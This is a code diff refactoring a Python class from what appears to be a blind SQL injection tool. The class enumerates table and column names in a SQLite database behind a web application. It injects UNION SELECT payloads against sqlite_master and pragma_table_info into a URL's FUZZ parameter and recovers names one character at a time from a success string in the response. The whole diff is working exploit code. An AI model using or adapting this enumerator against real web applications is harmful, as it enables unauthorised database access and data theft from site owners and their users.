@@ -6,27 +6,22 @@ CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'
 
 
 class Sqlite_Enumerator():
-    def enumerate_table(self, opts, poison):
-        nulls = "".join([",null" for _ in range(0, opts.COLUMNS - 1)])
-        table_poison = "SELECT name" + nulls + \
-            " FROM sqlite_master WHERE type='table' AND name LIKE '"
-
-        known_tables = []
+    def _enumerate(self, opts, poison, base_poison, known_list, name_alias):
         known_chars = ""
         verified = False
+
         while not verified:
             iteration_interrupted = False
             for char in CHARS:
-                poison_str = poison + table_poison + known_chars + char + "%'"
-                if len(known_tables) > 0:
-                    poison_str += "".join([" AND name != '" +
-                                          e + "'" for e in known_tables])
-
+                poison_str = poison + base_poison + known_chars + char + "%'"
+                if known_list:
+                    poison_str += "".join(
+                        [f" AND {name_alias} != '{e}'" for e in known_list]
+                    )
                 poison_str += ";--"
 
                 poison_url = opts.URL.replace("FUZZ", poison_str)
-                response = request("get", poison_url)
-                response = response.text
+                response = request("get", poison_url).text
 
                 if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                     print(
@@ -38,44 +33,24 @@ class Sqlite_Enumerator():
                     break
 
             if not iteration_interrupted and known_chars != "":
-                known_tables.append(known_chars)
+                known_list.append(known_chars)
                 known_chars = ""
             elif not iteration_interrupted:
-                return known_tables
+                return known_list
+
+    def enumerate_table(self, opts, poison):
+        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
+        base_poison = f"SELECT name{
+            nulls} FROM sqlite_master WHERE type='table' AND name LIKE '"
+
+        return self._enumerate(opts, poison, base_poison, [], "name")
 
     def enumerate_columns(self, opts, poison, table_name):
-        nulls = "".join([",null" for _ in range(0, opts.COLUMNS - 1)])
-        column_poison = "SELECT p.name " + nulls + " FROM sqlite_master AS m JOIN pragma_table_info('" + \
-            table_name + "') AS p WHERE m.type='table' AND p.name LIKE '"
+        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
+        base_poison = (
+            f"SELECT p.name{nulls} FROM sqlite_master AS m "
+            f"JOIN pragma_table_info('{table_name}') AS p "
+            f"WHERE m.type='table' AND p.name LIKE '"
+        )
 
-        known_columns = []
-        known_chars = ""
-        verified = False
-        while not verified:
-            iteration_interrupted = False
-            for char in CHARS:
-                poison_str = poison + column_poison + known_chars + char + "%'"
-                if len(known_columns) > 0:
-                    poison_str += "".join([" AND p.name != '" +
-                                          e + "'" for e in known_columns])
-
-                poison_str += ";--"
-
-                poison_url = opts.URL.replace("FUZZ", poison_str)
-                response = request("get", poison_url)
-                response = response.text
-
-                if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
-                    print(
-                        '[x] Response reading ambiguous, try specifying response strings')
-                    exit(1)
-                elif opts.SUCCESS_STR in response:
-                    known_chars += char
-                    iteration_interrupted = True
-                    break
-
-            if not iteration_interrupted and known_chars != "":
-                known_columns.append(known_chars)
-                known_chars = ""
-            elif not iteration_interrupted:
-                return known_columns
+        return self._enumerate(opts, poison, base_poison, [], "p.name")
